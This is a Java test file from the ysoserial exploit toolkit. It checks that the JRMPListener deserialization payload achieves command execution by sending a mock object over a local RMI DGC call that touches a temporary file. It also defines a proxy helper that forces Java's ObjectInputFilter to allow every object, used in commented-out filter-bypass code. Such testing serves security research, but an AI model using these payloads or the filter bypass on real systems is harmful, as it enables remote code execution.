package ysoserial.test.payloads;

import org.junit.Assert;
    import sun.rmi.transport.ObjectTable;
import ysoserial.Strings;
import ysoserial.exploit.JRMPClient;
import ysoserial.payloads.JRMPListener;
import ysoserial.payloads.util.Reflections;
import ysoserial.test.CustomTest;
import ysoserial.test.util.Files;
import ysoserial.test.util.OS;

import java.io.File;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.util.Random;
import java.util.concurrent.Callable;

public class JRMPListenerTest implements CustomTest, NeedsAddlClasses {
    private final File testFile = new File(OS.getTmpDir(), "ysoserial-test-" + Strings.randUUID());
    private final int port = 16000 + new Random().nextInt(16000);

    @Override
    public void run(Callable<Object> payload) throws Exception {
        Assert.assertFalse("test file shouldn't exist", testFile.exists());

        // disable ObjectInputFilter if defined
//        Object filter = getFilter();
//        if (filter != null) {
//            Field f = Reflections.getField(Class.forName("sun.rmi.transport.DGCImpl"), "dgcFilter");
//            if (f != null) {
//                f.set(null, filter);
//            }
//        }

        // open listener
        Remote res = (Remote) payload.call();

        try {
            // send payload
            JRMPClient.makeDGCCall("localhost", port, new TestHarnessTest.ExecMockSerializable(CommandExecTest.getTouchCmd(testFile.toString())));

            Files.waitForFile(testFile, 5000);

            Assert.assertTrue("test file should exist", testFile.exists());
        } finally {
            // close listener
            // TODO move to postDeserRelease
            ObjectTable.unexportObject(res, true);
        }
    }

    @Override
    public String getPayloadArgs() {
        return "" + port;
    }

    public static void main(String[] args) throws Exception {
        PayloadsTest.testPayload(JRMPListener.class, new Class[0]);
    }

    public Class[] getAddlClasses() {
        return new Class[] { TestHarnessTest.ExecMockSerializable.class };
    }

    public static Class<?> loadFirstClass(String ... classNames) {
        for (String className : classNames) {
            try {
                Class<?> clazz = Class.forName(className);
                return clazz;
            } catch (Exception e) {}
        }
        return null;
    }

    public static Object getFilter() throws Exception {
        final Class<?> filterClass = loadFirstClass(
            "java.io.ObjectInputFilter", "sun.misc.ObjectInputFilter");
        if (filterClass == null) {
            return null;
        }
        final Class<?> statusClass = Class.forName(filterClass.getName() + "$Status");
        return filterClass != null ? Proxy.newProxyInstance(
            JRMPListener.class.getClass().getClassLoader(),
            new Class[]{ filterClass },
            new InvocationHandler() {
                @Override
                public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                    for (Enum<?> e : (Enum<?>[]) statusClass.getEnumConstants()) {
                        if (e.name() == "ALLOWED") {
                            return e;
                        }
                    }
                    throw new RuntimeException("no matching enum");
                }
            }
        ) : null;
    }
}
